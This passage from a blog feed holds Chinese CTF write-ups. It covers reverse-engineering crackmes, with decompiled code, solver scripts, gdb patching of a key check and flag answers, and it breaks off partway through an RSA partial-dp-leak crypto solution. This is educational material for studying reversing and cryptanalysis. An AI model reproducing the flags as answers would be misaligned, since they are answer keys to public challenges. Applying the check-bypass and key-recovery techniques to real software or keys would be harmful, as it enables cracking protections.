其他要考的点，不太清楚","categories":[{"name":"Study","slug":"Study","permalink":"https://github.com/gha01un/gha01un.github.io/categories/Study/"}],"tags":[{"name":"AI","slug":"AI","permalink":"https://github.com/gha01un/gha01un.github.io/tags/AI/"}],"author":"H1un"},{"title":"攻防世界高手区","slug":"攻防世界高手","date":"2020-11-24T07:22:22.351Z","updated":"2021-01-11T01:41:52.124Z","comments":true,"path":"2020/11/24/攻防世界高手/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2020/11/24/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E9%AB%98%E6%89%8B/","excerpt":"实验课写写之前做过的题叭","text":"实验课写写之前做过的题叭 Guess-the-Number下载文件，得到一个jar包，解压得到一个class文件 这个地方要用到一个反编译插件jadclipse，得到guess.class文件的源代码如下（全部）。 if (my_number / 5 == guess_number) {//可求得guess_number为309137378， 输入命令java -jar guess.jar 309137378 Shuffle查看是32位文件，拖入ida查看，F5 按R查看字符串得到flag re-for-50-plz-50 打开ida，发现这是MIPS代码。本来准备安装RetDec，哎…还是恶补MIPS指令知识吧:https://www.cnblogs.com/thoupin/p/4018455.html 分析重点 这实际上就是一个对字符串的异或操作 str1 = 'cbtcqLUBChERV[[Nh@_X^D]X_YPV[CJ'flag = ''for i in str1: flag += chr(ord(i)^0x37) print(flag) dmd-50 可以看到是ELF64位文件，需要在linux环境运行 可以看到需要输入正确的key F5查看伪代码，发现是md5加密。 然后我们继续往下看，从if判断条件中，可以得知加密后的密文 编写脚本 parallel-comparator-200C文件 #include &lt;stdlib.h&gt;#include &lt;stdio.h&gt;#include &lt;pthread.h&gt;#define FLAG_LEN 20void * checking(void *arg) &#123; char *result = malloc(sizeof(char)); char *argument = (char *)arg; *result = (argument[0]+argument[1]) ^ argument[2];//argument[0]&gt;97 return result;&#125;int highly_optimized_parallel_comparsion(char *user_string)&#123; int initialization_number; int i; char generated_string[FLAG_LEN + 1]; generated_string[FLAG_LEN] = '\\0'; while ((initialization_number = random()) &gt;= 64);//开始认为随机数且大于64，事实上为一固定数37 int first_letter; first_letter = (initialization_number % 26) + 97;//97-123 pthread_t thread[FLAG_LEN]; char differences[FLAG_LEN] = &#123;0, 9, -9, -1, 13, -13, -4, -11, -9, -1, -7, 6, -13, 13, 3, 9, -13, -11, 6, -7&#125;; char *arguments[20]; //没有全部执行， for (i = 0; i &lt; FLAG_LEN; i++) &#123; arguments[i] = (char *)malloc(3*sizeof(char)); arguments[i][0] = first_letter;//三个数拼接到一起 随机的 arguments[i][1] = differences[i];//固定的 arguments[i][2] = user_string[i];//输入的 pthread_create((pthread_t*)(thread+i), NULL, checking, arguments[i]); &#125; void *result; int just_a_string[FLAG_LEN] = &#123;115, 116, 114, 97, 110, 103, 101, 95, 115, 116, 114, 105, 110, 103, 95, 105, 116, 95, 105, 115&#125;; for (i = 0; i &lt; FLAG_LEN; i++) &#123; pthread_join(*(thread+i), &amp;result); generated_string[i] = *(char *)result + just_a_string[i]; free(result); free(arguments[i]); &#125; int is_ok = 1; for (i = 0; i &lt; FLAG_LEN; i++) &#123; if (generated_string[i] != just_a_string[i]) return 0; &#125; return 1;&#125;int main()&#123; char *user_string = (char *)calloc(FLAG_LEN+1, sizeof(char)); fgets(user_string, FLAG_LEN+1, stdin); int is_ok = highly_optimized_parallel_comparsion(user_string); if (is_ok) printf(\"You win!\\n\"); else printf(\"Wrong!\\n\"); return 0;&#125; 粗略看一遍,发现 pthread_t 以及pthread_join pthread_create函数看不懂，于是网上查资料,得知 pthread_t typedef unsigned __int64 uintptr_ttypedef uintptr_t pthread_t; pthread_create ：作用为创建新线程，如果创建成功则返回0，否则返回error number`` int pthread_create(pthread_t *thread, const pthread_attr_t *attr,void *(*start_routine)(void*), void *arg); pthread_t *thread 是线程的标识符 pthread_attr_t *attr用来设置线程属性（如果为NULL，则为默认属性} void *(*start_routine)(void*) 是运行函数的起始地址 void *arg运行函数的参数 prhread_join : 作用为等待一个线程的结束，如果成功则返回0，否则返回error number`` int pthread_join(pthread_t thread, void **value_ptr); pthread_t thread线程标识符 void **value_ptr 存储被等待线程的返回值 有了以上知识，可以很容易可以知道user_string[20] (输入数组)的每个元素加上first_letter（经调试为固定值108），然后再与 differences[20]的元素异或,最后与just_a_string[20]的元素进行比较，用代码描述就是： strcmp（ ( user_string[i] + first_letter ) ^ differences[i] ， just_a_string[i] ) 脚本： 1 a = [0, 9, -9, -1, 13, -13, -4, -11, -9, -1, -7, 6, -13, 13, 3, 9, -13, -11, 6, -7]2 flag = ''3 for i in range(len(a)):4 for j in range(127):5 if ((a[i]+108) ^ (j+1)) == 0:6 flag += chr(j+1)7 break8 print(flag) secret-galaxy-300运行程序 ida查看字符串 动态调试，看运行后内存信息 发现了一串字符 aliens_are_around_us提交，成功。 srm-50exe文件 运行程序，可知是 MFC 框架的对话框程序，随便输入数据，显示注册失败。IDA 静态分析 IDA 分析，找到 winmain，是 MFC 的主函数 读程序可知先是验证邮箱的合法性，然后验证 v11，可推测 flag 长度为 16，但是 v11 是 一个长度为 4 的 char 数组 CHAR v11[4]，如果输入超过四位就到 v12-v23，刚好 16 个。 编写程序 得到flag simple-check-100这道题值得记录一下，因为这道题让我第一次接触peda。 1 int __cdecl main(int argc, const char **argv, const char **envp) 2 &#123; 3 void *v3; // esp 4 void *v4; // esp 5 char *v6; // [esp+4h] [ebp-44h] 6 char v7; // [esp+8h] [ebp-40h] 7 char v8; // [esp+1Bh] [ebp-2Dh] 8 char *v9; // [esp+1Ch] [ebp-2Ch] 9 int v10; // [esp+20h] [ebp-28h]10 char v11; // [esp+25h] [ebp-23h]11 char v12; // [esp+26h] [ebp-22h]12 char v13; // [esp+27h] [ebp-21h]13 char v14; // [esp+28h] [ebp-20h]14 char v15; // [esp+29h] [ebp-1Fh]15 char v16; // [esp+2Ah] [ebp-1Eh]16 char v17; // [esp+2Bh] [ebp-1Dh]17 char v18; // [esp+2Ch] [ebp-1Ch]18 char v19; // [esp+2Dh] [ebp-1Bh]19 char v20; // [esp+2Eh] [ebp-1Ah]20 char v21; // [esp+2Fh] [ebp-19h]21 char v22; // [esp+30h] [ebp-18h]22 char v23; // [esp+31h] [ebp-17h]23 char v24; // [esp+32h] [ebp-16h]24 char v25; // [esp+33h] [ebp-15h]25 char v26; // [esp+34h] [ebp-14h]26 char v27; // [esp+35h] [ebp-13h]27 char v28; // [esp+36h] [ebp-12h]28 char v29; // [esp+37h] [ebp-11h]29 char v30; // [esp+38h] [ebp-10h]30 char v31; // [esp+39h] [ebp-Fh]31 char v32; // [esp+3Ah] [ebp-Eh]32 char v33; // [esp+3Bh] [ebp-Dh]33 char v34; // [esp+3Ch] [ebp-Ch]34 char v35; // [esp+3Dh] [ebp-Bh]35 char v36; // [esp+3Eh] [ebp-Ah]36 char v37; // [esp+3Fh] [ebp-9h]37 int *v38; // [esp+40h] [ebp-8h]38 39 v38 = &amp;argc;40 __main();41 v8 = 'T';42 v37 = -56;43 v36 = 126;44 v35 = -29;45 v34 = 100;46 v33 = -57;47 v32 = 22;48 v31 = -102;49 v30 = -51;50 v29 = 17;51 v28 = 101;52 v27 = 50;53 v26 = 45;54 v25 = -29;55 v24 = -45;56 v23 = 67;57 v22 = -110;58 v21 = -87;59 v20 = -99;60 v19 = -46;61 v18 = -26;62 v17 = 109;63 v16 = 44;64 v15 = -45;65 v14 = -74;66 v13 = -67;67 v12 = -2;68 v11 = 106;69 v10 = 19;70 v3 = alloca(32);71 v4 = alloca(32);72 v9 = &amp;v7;73 printf(\"Key: \");74 v6 = v9;75 scanf(\"%s\", v9);76 if ( check_key((int)v9) )77 interesting_function((int)&amp;v8);78 else79 puts(\"Wrong\");80 return 0;81 &#125; 很明显只要绕过第76行代码，我们就能够获取我们需要的flag，而且v8还是已知的 将Linux下的那个文件放入Linux调试。 task9_x86_64_46d01fe312d35ecf69c4ff8ab8ace75d080891dc 命令 gdbfile task9_x86_64_46d01fe312d35ecf69c4ff8ab8ace75d080891dcb mainr 然后一直执行命令next，运行到check_key函数处 把test eax,eax改为真就行，也就是把eax改为1。 修改eax set $eax&#x3D;1 Mysteriousint __stdcall sub_401090(HWND hWnd, int a2, int a3, int a4)&#123; char v5; // [esp+50h] [ebp-310h] CHAR Text[4]; // [esp+154h] [ebp-20Ch] char v7; // [esp+159h] [ebp-207h] __int16 v8; // [esp+255h] [ebp-10Bh] char v9; // [esp+257h] [ebp-109h] int v10_108; // [esp+258h] [ebp-108h] CHAR myinput; // [esp+25Ch] [ebp-104h] char v11_101; // [esp+25Fh] [ebp-101h] char v12_100; // [esp+260h] [ebp-100h] char v13_FF; // [esp+261h] [ebp-FFh] memset(&amp;myinput, 0, 0x104u); v10_108 = 0; if ( a2 == 16 ) &#123; DestroyWindow(hWnd); PostQuitMessage(0); &#125; else if ( a2 == 273 ) &#123; if ( a3 == 1000 ) &#123; GetDlgItemTextA(hWnd, 1002, &amp;myinput, 260); strlen(&amp;myinput); if ( strlen(&amp;myinput) &gt; 6 ) // 输入小于7位 ExitProcess(0); v10_108 = atoi(&amp;myinput) + 1; // int atoi(const char *nptr);是把字符串转换成整型数的一个函数。扫描nptr，如果遇到‘0-9’之外的字符便停止。 // v10=转换的数字+1 if ( v10_108 == 123 &amp;&amp; v11_101 == 'x' &amp;&amp; v13_FF == 'z' &amp;&amp; v12_100 == 'y' )// 输入atoi转整形得到结果+1等于123,则输入开始的数字部分为122 // 输入的后3位为xyz &#123; strcpy(Text, \"flag\"); // 下面开始拼接flag memset(&amp;v7, 0, 0xFCu); v8 = 0; v9 = 0; _itoa(v10_108, &amp;v5, 10); strcat(Text, \"&#123;\"); strcat(Text, &amp;v5); strcat(Text, \"_\"); strcat(Text, \"Buff3r_0v3rf|0w\"); strcat(Text, \"&#125;\"); MessageBoxA(0, Text, \"well done\", 0); &#125; SetTimer(hWnd, 1u, 0x3E8u, TimerFunc); &#125; if ( a3 == 1001 ) KillTimer(hWnd, 1u); &#125; return 0;&#125; flag{123_Buff3r_0v3rf|0w} Newbie_calculations题目名百度翻译成新手计算，那我猜应该是个实现计算器的题目。。。。 IDA打开程序，发现一长串的函数反复调用，而且程序没有输入，只有输出。额，那这样的话程序运行就应该输出flag，但程序中肯定会有垃圾循环操作，就让你跑不出来。 这种题目就要分析函数作用，简化，自己实现算法。 for ( i = 0; i &lt; 32; ++i ) flag[i] = 1; v121 = 0; puts(\"Your flag is:\"); v3 = mul_401100(flag, 0x3B9ACA00); v4 = sub_401220(v3, 0x3B9AC9CE); mul_401100(v4, 2); v5 = add_401000(&amp;flag[1], 0x4C4B40); v6 = sub_401220(v5, 0x65B9AA); v7 = add_401000(v6, 1666666); v8 = add_401000(v7, 45); v9 = mul_401100(v8, 2); add_401000(v9, 5); v10 = mul_401100(&amp;flag[2], 0x3B9ACA00); v11 = sub_401220(v10, 999999950); v12 = mul_401100(v11, 2); add_401000(v12, 2); v13 = add_401000(&amp;flag[3], 55); v14 = sub_401220(v13, 3); v15 = add_401000(v14, 4); sub_401220(v15, 1); v16 = mul_401100(&amp;flag[4], 100000000); v17 = sub_401220(v16, 99999950); v18 = mul_401100(v17, 2); add_401000(v18, 2); v19 = sub_401220(&amp;flag[5], 1); v20 = mul_401100(v19, 1000000000); v21 = add_401000(v20, 55); sub_401220(v21, 3); v22 = mul_401100(&amp;flag[6], 1000000); v23 = sub_401220(v22, 999975); mul_401100(v23, 4); v24 = add_401000(&amp;flag[7], 55); v25 = sub_401220(v24, 33); v26 = add_401000(v25, 44); sub_401220(v26, 11); v27 = mul_401100(&amp;flag[8], 10); v28 = sub_401220(v27, 5); v29 = mul_401100(v28, 8); add_401000(v29, 9); v30 = add_401000(&amp;flag[9], 0); v31 = sub_401220(v30, 0); v32 = add_401000(v31, 11); v33 = sub_401220(v32, 11); add_401000(v33, 53); v34 = add_401000(&amp;flag[10], 49); v35 = sub_401220(v34, 2); v36 = add_401000(v35, 4); sub_401220(v36, 2); v37 = mul_401100(&amp;flag[11], 1000000); v38 = sub_401220(v37, 999999); v39 = mul_401100(v38, 4); add_401000(v39, 50); v40 = add_401000(&amp;flag[12], 1); v41 = add_401000(v40, 1); v42 = add_401000(v41, 1); v43 = add_401000(v42, 1); v44 = add_401000(v43, 1); v45 = add_401000(v44, 1); v46 = add_401000(v45, 10); add_401000(v46, 32); v47 = mul_401100(&amp;flag[13], 10); v48 = sub_401220(v47, 5); v49 = mul_401100(v48, 8); v50 = add_401000(v49, 9); add_401000(v50, 48); v51 = sub_401220(&amp;flag[14], 1); v52 = mul_401100(v51, -294967296); v53 = add_401000(v52, 55); sub_401220(v53, 3); v54 = add_401000(&amp;flag[15], 1); v55 = add_401000(v54, 2); v56 = add_401000(v55, 3); v57 = add_401000(v56, 4); v58 = add_401000(v57, 5); v59 = add_401000(v58, 6); v60 = add_401000(v59, 7); add_401000(v60, 20); v61 = mul_401100(&amp;flag[16], 10); v62 = sub_401220(v61, 5); v63 = mul_401100(v62, 8); v64 = add_401000(v63, 9); add_401000(v64, 48); v65 = add_401000(&amp;flag[17], 7); v66 = add_401000(v65, 6); v67 = add_401000(v66, 5); v68 = add_401000(v67, 4); v69 = add_401000(v68, 3); v70 = add_401000(v69, 2); v71 = add_401000(v70, 1); add_401000(v71, 20); v72 = add_401000(&amp;flag[18], 7); v73 = add_401000(v72, 2); v74 = add_401000(v73, 4); v75 = add_401000(v74, 3); v76 = add_401000(v75, 6); v77 = add_401000(v76, 5); v78 = add_401000(v77, 1); add_401000(v78, 20); v79 = mul_401100(&amp;flag[19], 1000000); v80 = sub_401220(v79, 999999); v81 = mul_401100(v80, 4); v82 = add_401000(v81, 50); sub_401220(v82, 1); v83 = sub_401220(&amp;flag[20], 1); v84 = mul_401100(v83, -294967296); v85 = add_401000(v84, 49); sub_401220(v85, 1); v86 = sub_401220(&amp;flag[21], 1); v87 = mul_401100(v86, 1000000000); v88 = add_401000(v87, 54); v89 = sub_401220(v88, 1); v90 = add_401000(v89, 1000000000); sub_401220(v90, 1000000000); v91 = add_401000(&amp;flag[22], 49); v92 = sub_401220(v91, 1); v93 = add_401000(v92, 2); sub_401220(v93, 1); v94 = mul_401100(&amp;flag[23], 10); v95 = sub_401220(v94, 5); v96 = mul_401100(v95, 8); v97 = add_401000(v96, 9); add_401000(v97, 48); v98 = add_401000(&amp;flag[24], 1); v99 = add_401000(v98, 3); v100 = add_401000(v99, 3); v101 = add_401000(v100, 3); v102 = add_401000(v101, 6); v103 = add_401000(v102, 6); v104 = add_401000(v103, 6); add_401000(v104, 20); v105 = add_401000(&amp;flag[25], 55); v106 = sub_401220(v105, 33); v107 = add_401000(v106, 44); v108 = sub_401220(v107, 11); add_401000(v108, 42); add_401000(&amp;flag[26], flag[25]); add_401000(&amp;flag[27], flag[12]); v109 = flag[27]; v110 = sub_401220(&amp;flag[28], 1); v111 = add_401000(v110, v109); sub_401220(v111, 1); v112 = flag[23]; v113 = sub_401220(&amp;flag[29], 1); v114 = mul_401100(v113, 1000000); add_401000(v114, v112); v115 = flag[27]; v116 = add_401000(&amp;flag[30], 1); mul_401100(v116, v115); add_401000(&amp;flag[31], flag[30]); print_401C7F(\"CTF&#123;\"); for ( j = 0; j &lt; 32; ++j ) print_401C7F(\"%c\", SLOBYTE(flag[j])); print_401C7F(\"&#125;\\n\"); return 0;&#125; 这道题目的关键就在于如何识别出上面这些函数的作用 _DWORD *__cdecl mul_401100(_DWORD *a1, int a2)&#123; int v2; // ST20_4 signed int v4; // [esp+Ch] [ebp-1Ch] int v5; // [esp+14h] [ebp-14h] int v6; // [esp+18h] [ebp-10h] int v7; // [esp+1Ch] [ebp-Ch] int v8; // [esp+20h] [ebp-8h] v5 = *a1; v6 = a2; v4 = -1; v8 = 0; v7 = a2 * v5; while ( a2 ) // a1累加a2次 相当于a1*a2 &#123; v2 = v7 * v5; add_401000(&amp;v8, *a1); ++v7; --a2; v6 = v2 - 1; &#125; while ( v4 ) // 循环结束a1=a1-1 &#123; ++v7; ++*a1; --v4; --v6; &#125; ++*a1; *a1 = v8; return a1;&#125; 1 int *__cdecl add_401000(int *a1, int a2) 2 &#123; 3 int v2; // edx 4 int v4; // [esp+Ch] [ebp-18h] 5 int v5; // [esp+10h] [ebp-14h] 6 int v6; // [esp+18h] [ebp-Ch] 7 signed int v7; // [esp+1Ch] [ebp-8h] 8 9 v5 = -1;10 v4 = -1 - a2 + 1;11 v7 = 1231;12 v2 = *a1;13 v6 = a2 + 1231;14 while ( v4 ) 15 // 循环结束 a1=a1+a216 &#123;17 ++v7;18 --*a1; //循环- 相当于-（-a2) +a219 --v4;20 --v6;21 &#125;22 while ( v5 )23 &#123;24 --v6;25 ++*a1;26 --v5;27 &#125;28 ++*a1; // a1在上面的循环中-1，现在+1，还是原值29 return a1;30 &#125; _DWORD *__cdecl sub_401220(_DWORD *a1, int a2)&#123; int v3; // [esp+8h] [ebp-10h] signed int v4; // [esp+Ch] [ebp-Ch] signed int v5; // [esp+14h] [ebp-4h] int v6; // [esp+14h] [ebp-4h] v4 = -1; v3 = -1 - a2 + 1; v5 = -1; while ( v3 ) // -a2 &#123; ++*a1; // 循环结束，相当于 a1=a1-a2 --v3; --v5; &#125; v6 = v5 * v5; while ( v4 ) // 这个循环后 a1=a1-1 &#123; v6 *= 123; ++*a1; --v4; &#125; ++*a1; // a1+=1,恢复上一个循环前的值 return a1;&#125; WP def mul_401100(a,b): return a*bdef sub_401220(a,b): return a-bdef add_401000(a,b): return a+bflag=[1 for i in range(32)]v121 = 0print(\"Your flag is:\")v3 = mul_401100(flag[0], 0x3B9ACA00)v4 = sub_401220(v3, 0x3B9AC9CE)flag[0]=mul_401100(v4, 2)v5 = add_401000(flag[1], 0x4C4B40)v6 = sub_401220(v5, 0x65B9AA)v7 = add_401000(v6, 1666666)v8 = add_401000(v7, 45)v9 = mul_401100(v8, 2)flag[1]=add_401000(v9, 5)v10 = mul_401100(flag[2], 0x3B9ACA00)v11 = sub_401220(v10, 999999950)v12 = mul_401100(v11, 2)flag[2]=add_401000(v12, 2)v13 = add_401000(flag[3], 55)v14 = sub_401220(v13, 3)v15 = add_401000(v14, 4)flag[3]=sub_401220(v15, 1)v16 = mul_401100(flag[4], 100000000)v17 = sub_401220(v16, 99999950)v18 = mul_401100(v17, 2)flag[4]=add_401000(v18, 2)v19 = sub_401220(flag[5], 1)v20 = mul_401100(v19, 1000000000)v21 = add_401000(v20, 55)flag[5]=sub_401220(v21, 3)v22 = mul_401100(flag[6], 1000000)v23 = sub_401220(v22, 999975)flag[6]=mul_401100(v23, 4)v24 = add_401000(flag[7], 55)v25 = sub_401220(v24, 33)v26 = add_401000(v25, 44)flag[7]=sub_401220(v26, 11)v27 = mul_401100(flag[8], 10)v28 = sub_401220(v27, 5)v29 = mul_401100(v28, 8)flag[8]=add_401000(v29, 9)v30 = add_401000(flag[9], 0)v31 = sub_401220(v30, 0)v32 = add_401000(v31, 11)v33 = sub_401220(v32, 11)flag[9]=add_401000(v33, 53)v34 = add_401000(flag[10], 49)v35 = sub_401220(v34, 2)v36 = add_401000(v35, 4)flag[10]=sub_401220(v36, 2)v37 = mul_401100(flag[11], 1000000)v38 = sub_401220(v37, 999999)v39 = mul_401100(v38, 4)flag[11]=add_401000(v39, 50)v40 = add_401000(flag[12], 1)v41 = add_401000(v40, 1)v42 = add_401000(v41, 1)v43 = add_401000(v42, 1)v44 = add_401000(v43, 1)v45 = add_401000(v44, 1)v46 = add_401000(v45, 10)flag[12]=add_401000(v46, 32)v47 = mul_401100(flag[13], 10)v48 = sub_401220(v47, 5)v49 = mul_401100(v48, 8)v50 = add_401000(v49, 9)flag[13]=add_401000(v50, 48)v51 = sub_401220(flag[14], 1)v52 = mul_401100(v51, -294967296)v53 = add_401000(v52, 55)flag[14]=sub_401220(v53, 3)v54 = add_401000(flag[15], 1)v55 = add_401000(v54, 2)v56 = add_401000(v55, 3)v57 = add_401000(v56, 4)v58 = add_401000(v57, 5)v59 = add_401000(v58, 6)v60 = add_401000(v59, 7)flag[15]=add_401000(v60, 20)v61 = mul_401100(flag[16], 10)v62 = sub_401220(v61, 5)v63 = mul_401100(v62, 8)v64 = add_401000(v63, 9)flag[16]=add_401000(v64, 48)v65 = add_401000(flag[17], 7)v66 = add_401000(v65, 6)v67 = add_401000(v66, 5)v68 = add_401000(v67, 4)v69 = add_401000(v68, 3)v70 = add_401000(v69, 2)v71 = add_401000(v70, 1)flag[17]=add_401000(v71, 20)v72 = add_401000(flag[18], 7)v73 = add_401000(v72, 2)v74 = add_401000(v73, 4)v75 = add_401000(v74, 3)v76 = add_401000(v75, 6)v77 = add_401000(v76, 5)v78 = add_401000(v77, 1)flag[18]=add_401000(v78, 20)v79 = mul_401100(flag[19], 1000000)v80 = sub_401220(v79, 999999)v81 = mul_401100(v80, 4)v82 = add_401000(v81, 50)flag[19]=sub_401220(v82, 1)v83 = sub_401220(flag[20], 1)v84 = mul_401100(v83, -294967296)v85 = add_401000(v84, 49)flag[20]=sub_401220(v85, 1)v86 = sub_401220(flag[21], 1)v87 = mul_401100(v86, 1000000000)v88 = add_401000(v87, 54)v89 = sub_401220(v88, 1)v90 = add_401000(v89, 1000000000)flag[21]=sub_401220(v90, 1000000000)v91 = add_401000(flag[22], 49)v92 = sub_401220(v91, 1)v93 = add_401000(v92, 2)flag[22]=sub_401220(v93, 1)v94 = mul_401100(flag[23], 10)v95 = sub_401220(v94, 5)v96 = mul_401100(v95, 8)v97 = add_401000(v96, 9)flag[23]=add_401000(v97, 48)v98 = add_401000(flag[24], 1)v99 = add_401000(v98, 3)v100 = add_401000(v99, 3)v101 = add_401000(v100, 3)v102 = add_401000(v101, 6)v103 = add_401000(v102, 6)v104 = add_401000(v103, 6)flag[24]=add_401000(v104, 20)v105 = add_401000(flag[25], 55)v106 = sub_401220(v105, 33)v107 = add_401000(v106, 44)v108 = sub_401220(v107, 11)flag[25]=add_401000(v108, 42)flag[26]=add_401000(flag[26], flag[25])flag[27]=add_401000(flag[27], flag[12])v109 = flag[27]v110 = sub_401220(flag[28], 1)v111 = add_401000(v110, v109)flag[28]=sub_401220(v111, 1)v112 = flag[23]v113 = sub_401220(flag[29], 1)v114 = mul_401100(v113, 1000000)flag[29]=add_401000(v114, v112)v115 = flag[27]v116 = add_401000(flag[30], 1)flag[30]=mul_401100(v116, v115)flag[31]=add_401000(flag[31], flag[30])print(\"CTF&#123;\"+''.join(map(chr,flag))+\"&#125;\") re1-100这题竟然放在了高手区 1 if ( numRead ) 2 &#123; 3 if ( childCheckDebugResult() ) 4 &#123; 5 responseFalse(); 6 &#125; 7 else if ( bufParentRead[0] == ‘&#123;‘ ) // 第一位 8 &#123; 9 if ( strlen(bufParentRead) == 42 ) // 输入的长度为42d10 &#123;11 if ( !strncmp(&amp;bufParentRead[1], \"53fc275d81\", 0xAuLL) )// 输入的1-10位（输入的第2位到第11位）12 &#123;13 if ( bufParentRead[strlen(bufParentRead) - 1] == ‘&#125;‘ )// 最后一位14 &#123;15 if ( !strncmp(&amp;bufParentRead[31], \"4938ae4efd\", 0xAuLL) )// 输入的31-40位16 &#123;17 if ( !confuseKey(bufParentRead, 42) )//关键18 &#123;19 responseFalse();20 &#125;21 else if ( !strncmp(bufParentRead, \"&#123;daf29f59034938ae4efd53fc275d81053ed5be8c&#125;\", 0x2AuLL) )// 修改后的结果进行比较22 &#123;23 responseTrue(); // &#123;53fc275d81053ed5be8cdaf29f59034938ae4efd&#125;24 &#125;25 else26 &#123;27 responseFalse(); 主要分析confuseKey(bufParentRead, 42)函数 1 bool __cdecl confuseKey(char *szKey, int iKeyLength) 2 &#123; 3 char szPart1[15]; // [rsp+10h] [rbp-50h] 4 char szPart2[15]; // [rsp+20h] [rbp-40h] 5 char szPart3[15]; // [rsp+30h] [rbp-30h] 6 char szPart4[15]; // [rsp+40h] [rbp-20h] 7 unsigned __int64 v7; // [rsp+58h] [rbp-8h] 8 9 v7 = __readfsqword(0x28u);10 *(_QWORD *)szPart1 = 0LL;11 *(_DWORD *)&amp;szPart1[8] = 0;12 *(_WORD *)&amp;szPart1[12] = 0;13 szPart1[14] = 0;14 *(_QWORD *)szPart2 = 0LL;15 *(_DWORD *)&amp;szPart2[8] = 0;16 *(_WORD *)&amp;szPart2[12] = 0;17 szPart2[14] = 0;18 *(_QWORD *)szPart3 = 0LL;19 *(_DWORD *)&amp;szPart3[8] = 0;20 *(_WORD *)&amp;szPart3[12] = 0;21 szPart3[14] = 0;22 *(_QWORD *)szPart4 = 0LL;23 *(_DWORD *)&amp;szPart4[8] = 0;24 *(_WORD *)&amp;szPart4[12] = 0;25 szPart4[14] = 0;26 if ( iKeyLength != 42 )27 return 0;28 if ( !szKey )29 return 0;30 if ( strlen(szKey) != 42 )31 return 0;32 if ( *szKey != 123 )33 return 0;34 strncpy(szPart1, szKey + 1, 0xAuLL); // 将输入去掉头尾&#123;&#125;后的部分分成4部分35 strncpy(szPart2, szKey + 11, 0xAuLL);36 strncpy(szPart3, szKey + 21, 0xAuLL);37 strncpy(szPart4, szKey + 31, 0xAuLL);38 memset(szKey, 0, iKeyLength);39 *szKey = ‘&#123;‘;40 strcat(szKey, szPart3); // 分割后的部分重新组合41 strcat(szKey, szPart4);42 strcat(szKey, szPart1);43 strcat(szKey, szPart2);44 szKey[41] = ‘&#125;‘;45 return 1;46 &#125; exp 1 s1=‘53fc275d81‘ 2 s4=‘4938ae4efd‘ 3 # 3,4,1,2 4 ss=‘daf29f59034938ae4efd53fc275d81053ed5be8c‘ 5 x=[] 6 for i in range(0,len(ss),10): 7 x.append(ss[i:i+10]) 8 print(x) 9 print(‘&#123;‘,‘‘.join((x[2],x[3],x[0],x[1])),‘&#125;‘,sep=‘‘)10 11 # [‘daf29f5903‘, ‘4938ae4efd‘, ‘53fc275d81‘, ‘053ed5be8c‘]12 # &#123;53fc275d81053ed5be8cdaf29f59034938ae4efd&#125; answer_to_everythingmain.exe 打开 image-20201124165527869 查壳 image-20201124165540233 不是有效的PE文件 即不是window 平台运行的软件 猜测是linux 将main.exe拖入ida 32 image-20201124165553289 得到信息 ELF64 for x86-64 elf即代表是在linux下运行的软件 64 代表 ida 32 分析不了这个 程序 得用ida 64 分析 所以现在拖入linux里 （ubuntu 64） 打开终端 然后查看 main.exe的权限 ls -a main.exe 然后显示 chmod a+x main.exe//变为可执行 //如果权限不够的话执行改命令 发现 -rwxrwxrwx此时有权限执行main.exe 000000 然后输入命令 ./main.exe 显示 然后随便输入 然后提示 YOUSUCK//你真笨 猜测 这个程序 先输出一句话 Gimme 然后又输入东西 错误的话 输出 YOUFUCK 正确的话 输出我们想要的信息 接下来 将main.exe 拖入ida 64 查找 关键字符串 Gimme//因为很少直接看到了就不用再搜索了 双击 进去与之对应的代码段 可以看到 然后敲击键盘上的x键可查看那几个引用它了 敲击 X 键 点进去为一个函数 tab 反汇编 即明白了 我们在linux中应该输入42 然后他输出 Cipher from Bill \\nSubmit without any tags\\n#kdudpeh 猜测 kdudpeh 是我们想要的flag ISCC{kdudpeh} 提交错误 看题目注意到 sha1 以为是 sha1碰撞 后来发现是 shi1加密 获得flag为： flag{80ee2a3fe31da904c596d993f7f1de4827c1450a}","categories":[{"name":"CTF","slug":"CTF","permalink":"https://github.com/gha01un/gha01un.github.io/categories/CTF/"}],"tags":[{"name":"RE","slug":"RE","permalink":"https://github.com/gha01un/gha01un.github.io/tags/RE/"}],"author":"H1un"},{"title":"“祥云杯”网络安全大赛","slug":"“祥云杯”网络安全大赛","date":"2020-11-23T10:13:49.922Z","updated":"2021-01-11T01:41:40.801Z","comments":true,"path":"2020/11/23/“祥云杯”网络安全大赛/","link":"","permalink":"https://github.com/gha01un/gha01un.github.io/2020/11/23/%E2%80%9C%E7%A5%A5%E4%BA%91%E6%9D%AF%E2%80%9D%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/","excerpt":"祥云杯复现","text":"祥云杯复现 CryptoExposure题目考点： dp高位泄露 题目： Do you know how to rsa? from Crypto.Util.number import *import gmpy2p &#x3D; getStrongPrime(512)q &#x3D; getStrongPrime(512)n &#x3D; p * qphi &#x3D; (p - 1) * (q - 1)e &#x3D; 7621d &#x3D; gmpy2.invert(e, phi)flag &#x3D; b&quot;flag&#123;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#125;&quot;c &#x3D; pow(bytes_to_long(flag), e, n)dp &#x3D; d % (p - 1)print(dp &gt;&gt; 200)print(c, e, n)&#39;&#39;&#39;dp&gt;&gt;200 &#x3D; 1153696846823715458342658568392537778171840014923745253759529432977932183322553944430236879985c &#x3D; 46735962204857190520476434898881001530665718155698898882603422023484998388668858692912250418134186095459060506275961050676051693220280588047233628259880712415593039977585805890920089318643002597837000049626154900908543384761210358835843974072960080857150727010985827690190496793207012355214605393036388807616e &#x3D; 7621n &#x3D; 140376049134934822153964243403031201922239588054133319056483413311963385321279682186354948441840374124640187894619689719746347334298621083485494086361152915457458004998419817456902929318697902819798254427945343361548635794308362823239150919240307072688623000747781103375481834571274423004856276841225675241863&#39;&#39;&#39;1234567891011121314151617181920212223 解题参考文章：https://github.com/pcw109550/write-up/tree/master/2019/KAPO/Lenstra-Lenstra-Lovasz 这道题知道secret = dp&gt;&gt;200，即已知dp的高位恢复出dp。 #sage#dp高位泄露攻击，这里泄露了(secret=dp&gt;&gt;200)secret = 1153696846823715458342658568392537778171840014923745253759529432977932183322553944430236879985e = 7621n = 140376049134934822153964243403031201922239588054133319056483413311963385321279682186354948441840374124640187894619689719746347334298621083485494086361152915457458004998419817456902929318697902819798254427945343361548635794308362823239150919240307072688623000747781103375481834571274423004856276841225675241863F.&lt;x&gt; = PolynomialRing(Zmod(n))d = inverse_mod(e, 